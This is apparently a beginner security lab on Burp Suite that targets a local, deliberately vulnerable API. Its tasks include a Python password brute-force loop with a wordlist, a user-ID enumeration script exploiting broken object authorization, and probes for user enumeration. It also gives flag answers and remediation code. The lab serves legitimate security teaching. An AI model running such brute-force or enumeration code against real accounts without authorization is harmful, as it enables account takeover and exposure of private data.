# Lab: Burp Suite Basics — Intercepting & Modifying API Requests

## Objective

Learn the fundamentals of Burp Suite by intercepting API requests via the proxy, replaying modified requests with Repeater, and automating brute-force attacks with Intruder. You will practice these concepts against the SocialHack API using both Burp Suite and Python equivalents.

## Metadata

<table><tbody><tr><th>Field</th><th>Value</th></tr>
<tr><td>**Difficulty**</td><td>Easy</td></tr>
<tr><td>**Estimated Time**</td><td>45 minutes</td></tr>
<tr><td>**Prerequisites**</td><td>Burp Suite Community Edition installed (or Python 3 with `requests`), basic HTTP knowledge</td></tr>
<tr><td>**OWASP API Category**</td><td>N/A — Foundational tool skills</td></tr>
</tbody>
</table>

* * *

## Background

### What Is Burp Suite?

Burp Suite is the industry-standard tool for web application security testing. It acts as an **intercepting proxy** between your browser (or API client) and the target server, allowing you to:

-   **Intercept** requests and responses in real-time
    
-   **Modify** any part of the HTTP traffic
    
-   **Replay** requests with alterations (Repeater)
    
-   **Automate** attacks like brute-forcing or fuzzing (Intruder)
    

### Key Burp Suite Components

<table><tbody><tr><th>Component</th><th>Purpose</th><th>Python Equivalent</th></tr>
<tr><td>**Proxy**</td><td>Intercept traffic</td><td>`requests` with `proxies=`</td></tr>
<tr><td>**Repeater**</td><td>Replay and modify single requests</td><td>Editing and re-running a `requests` call</td></tr>
<tr><td>**Intruder**</td><td>Automated payload injection</td><td>`for` loop with `requests`</td></tr>
<tr><td>**Decoder**</td><td>Encode/decode data (Base64, URL, etc.)</td><td>`base64`, `urllib.parse` modules</td></tr>
<tr><td>**Comparer**</td><td>Compare two responses</td><td>Python `difflib`</td></tr>
</tbody>
</table>

### Proxy Setup Overview

```
┌──────────┐     ┌──────────┐     ┌──────────┐
│  Browser  │────▶│   Burp    │────▶│  Target  │
│  / curl   │◀────│  Suite    │◀────│   API    │
└──────────┘     └──────────┘     └──────────┘
  127.0.0.1        127.0.0.1        localhost
                   :8080             :5001
```

* * *

## Lab Environment

<table><tbody><tr><th>Item</th><th>Value</th></tr>
<tr><td>Target API</td><td>`http://localhost:5001`</td></tr>
<tr><td>Burp Proxy</td><td>`http://127.0.0.1:8080` (default)</td></tr>
<tr><td>Test Users</td><td>alice/password123, bob/password123</td></tr>
</tbody>
</table>

* * *

## Tasks

### Task 1: Set Up Burp Suite Proxy

**Goal:** Configure Burp Suite to intercept HTTP traffic from curl or your browser.

**Steps:**

1.  **Launch Burp Suite Community Edition** and create a Temporary Project.
    
2.  Go to **Proxy → Proxy Settings → Proxy Listeners** and confirm the listener is running on `127.0.0.1:8080`.
    
3.  Navigate to the **Proxy → Intercept** tab and ensure **Intercept is on**.
    
4.  Use curl through the Burp proxy:
    

```bash
curl -s -x http://127.0.0.1:8080 \
  -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```

5.  In Burp, you should see the request appear in the **Intercept** tab. Click **Forward** to let it through.
    
6.  If you don't have Burp Suite, the Python equivalent is:
    

```python
import requests

# Direct request (no proxy)
resp = requests.post("http://localhost:5001/api/v1/auth/login", json={
    "username": "alice",
    "password": "password123"
})
print(resp.status_code, resp.json())

# Through Burp proxy
resp = requests.post("http://localhost:5001/api/v1/auth/login",
    json={"username": "alice", "password": "password123"},
    proxies={"http": "http://127.0.0.1:8080"}
)
```

Hint 1 Make sure Burp Suite is running **before** you send the curl request with `-x`. If curl hangs, it means Burp is intercepting the request — check the Intercept tab. Hint 2 If you get a connection error, verify the proxy port. Check **Proxy → Proxy Settings** in Burp. The default is `127.0.0.1:8080`. Hint 3 For HTTPS targets, you would need to install Burp's CA certificate. For this lab (HTTP), no certificate setup is needed.

* * *

### Task 2: Intercept and Observe a Login Request

**Goal:** Intercept a login request, examine its structure, and extract the JWT token from the response.

**Steps:**

1.  With Intercept ON, send the login request through Burp:
    

```bash
curl -s -x http://127.0.0.1:8080 \
  -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```

2.  In Burp's Intercept tab, examine the raw request. Note:
    
    -   The HTTP method and path
        
    -   The `Content-Type` header
        
    -   The JSON body with credentials
        
3.  Click **Forward** to send the request. Check the **HTTP history** tab (Proxy → HTTP history) to see both the request and response.
    
4.  In the response, locate the JWT token. It will look like:
    
    ```
    {"token":"eyJhbGciOiJIUzI1NiIs..."}
    ```
    
5.  Copy this token — you'll use it in the next task.
    

> **🚩 FLAG 1:** What are the three parts of a JWT token separated by? (What character?)

Hint 1 A JWT (JSON Web Token) has three parts: Header, Payload, and Signature. Hint 2 The three parts are encoded in Base64 and separated by a specific character. Look at the token structure: `xxxxx.yyyyy.zzzzz`Hint 3 JWT parts are separated by dots (`.`). The full format is: `header.payload.signature`

* * *

### Task 3: Use Repeater to Modify Requests

**Goal:** Use Burp Repeater (or Python) to modify a request and observe different responses.

**Steps:**

1.  In Burp's **HTTP history**, right-click the login request and select **Send to Repeater**.
    
2.  In the **Repeater** tab, modify the request to access a different user's profile. Change the URL from `/api/v1/auth/login` to `/api/v1/users/1` and change the method from POST to GET:
    
    ```
    GET /api/v1/users/1 HTTP/1.1
    Host: localhost:5001
    Authorization: Bearer <your-token-here>
    ```
    
3.  Click **Send** and observe alice's profile.
    
4.  Now change the URL to `/api/v1/users/2` to access bob's profile. Click **Send**.
    
5.  Try `/api/v1/users/3` (charlie — a private account). What do you notice?
    
6.  **Python equivalent — modifying user\_id dynamically:**
    

```python
import requests

# Login first
login_resp = requests.post("http://localhost:5001/api/v1/auth/login", json={
    "username": "alice",
    "password": "password123"
})
token = login_resp.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Iterate through user IDs (simulating Repeater)
for user_id in range(1, 6):
    resp = requests.get(f"http://localhost:5001/api/v1/users/{user_id}", headers=headers)
    print(f"User {user_id}: {resp.status_code} — {resp.json().get('username', 'N/A')}")
```

> **🚩 FLAG 2:** How many user profiles can alice access by iterating through user IDs 1-5?

Hint 1 Try each user ID from 1 to 5. For each one, note whether you get a successful response (200) or an error. Hint 2 In a secure API, alice should only be able to see her own profile (id=1). But this API might have a BOLA vulnerability... Hint 3 If the API has no authorization checks, alice can access all 5 user profiles (IDs 1-5). The answer is `5`.

* * *

### Task 4: Use Intruder for Brute-Force Login

**Goal:** Use Burp Intruder (or a Python loop) to try multiple passwords against a user account.

**Steps:**

1.  In Burp's HTTP history, right-click the login request and **Send to Intruder**.
    
2.  In the **Intruder → Positions** tab:
    
    -   Set the Attack type to **Sniper**
        
    -   Clear all positions, then highlight only the password value
        
    -   The payload position should look like: `{"username":"bob","password":"§password123§"}`
        
3.  In the **Intruder → Payloads** tab, add this word list:
    

```
password
123456
password123
admin
letmein
welcome
monkey
dragon
master
bob123
```

4.  Click **Start Attack** and observe which password returns a successful response (200 with a token vs. 401 with error).
    
5.  **Python equivalent — brute-force script:**
    

```python
import requests

passwords = [
    "password", "123456", "password123", "admin", "letmein",
    "welcome", "monkey", "dragon", "master", "bob123"
]

for pwd in passwords:
    resp = requests.post("http://localhost:5001/api/v1/auth/login", json={
        "username": "bob",
        "password": pwd
    })
    status = resp.status_code
    marker = "✓ SUCCESS" if status == 200 else "✗ failed"
    print(f"  [{status}] {pwd:20s} {marker}")
    if status == 200:
        print(f"  Token: {resp.json()['token'][:50]}...")
        break
```

> **🚩 FLAG 3:** Which password from the list above is bob's correct password?

Hint 1 Only one password in the list will return a 200 status code with a JWT token. Hint 2 The default password for test users in this lab is `password123`. Hint 3 Bob's password is `password123`. The response will be HTTP 200 with a token, while all others return 401.

* * *

### Task 5: Observe Response Differences

**Goal:** Notice how the API leaks information through different error messages.

**Steps:**

1.  Try logging in with a **non-existent user**:
    

```bash
curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"anything"}'
```

2.  Now try with a **valid user but wrong password**:
    

```bash
curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"wrongpassword"}'
```

3.  Compare the two error messages. Are they different?
    
4.  **Python comparison:**
    

```python
import requests

# Non-existent user
resp1 = requests.post("http://localhost:5001/api/v1/auth/login", json={
    "username": "nonexistent", "password": "anything"
})

# Wrong password for valid user
resp2 = requests.post("http://localhost:5001/api/v1/auth/login", json={
    "username": "alice", "password": "wrongpassword"
})

print(f"Non-existent user: {resp1.json()}")
print(f"Wrong password:    {resp2.json()}")
print(f"\nSame message? {resp1.json() == resp2.json()}")
```

> **🚩 FLAG 4:** What is the error message for a non-existent user vs. a wrong password? Are they different?

Hint 1 Secure APIs should return the same generic error for both cases to prevent user enumeration. Does this API do that? Hint 2 Look at the exact error message text. Verbose APIs might say "User not found" vs. "Wrong password" — revealing whether a username exists. Hint 3 The API likely returns `"User not found"` for non-existent users and `"Wrong password"` (or similar) for incorrect passwords. This is a user enumeration vulnerability.

* * *

## Flags Summary

<table><tbody><tr><th>Flag</th><th>Description</th><th>Expected Value</th></tr>
<tr><td>FLAG 1</td><td>JWT separator character</td><td>`.` (dot)</td></tr>
<tr><td>FLAG 2</td><td>Number of profiles alice can access (IDs 1-5)</td><td>`5` (BOLA vulnerability)</td></tr>
<tr><td>FLAG 3</td><td>Bob's password from the brute-force list</td><td>`password123`</td></tr>
<tr><td>FLAG 4</td><td>Different error messages for invalid user vs wrong password</td><td>Yes — verbose errors (user enumeration)</td></tr>
</tbody>
</table>

* * *

## Remediation

### 1\. Implement Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, default_limits=["100 per hour"])

@app.route("/api/v1/auth/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    # ... login logic
```

### 2\. Use Generic Error Messages

```python
# VULNERABLE — leaks user existence
if not user:
    return jsonify({"error": "User not found"}), 401
if not check_password(user, password):
    return jsonify({"error": "Wrong password"}), 401

# SECURE — generic message
if not user or not check_password(user, password):
    return jsonify({"error": "Invalid credentials"}), 401
```

### 3\. Implement Account Lockout

```python
MAX_ATTEMPTS = 5
LOCKOUT_MINUTES = 15

def login():
    attempts = get_login_attempts(username)
    if attempts >= MAX_ATTEMPTS:
        return jsonify({"error": "Account locked. Try again later."}), 429
```

### 4\. Add Authorization Checks

```python
@app.route("/api/v1/users/<int:user_id>")
@jwt_required
def get_user(user_id):
    current_user = get_jwt_identity()
    if current_user["id"] != user_id and current_user["role"] != "admin":
        return jsonify({"error": "Forbidden"}), 403
```

* * *

## References

-   [Burp Suite Documentation](https://portswigger.net/burp/documentation)
    
-   [OWASP Testing Guide — Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)
    
-   [OWASP API2:2023 — Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
    
-   [CWE-307: Brute Force](https://cwe.mitre.org/data/definitions/307.html)
    
-   [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)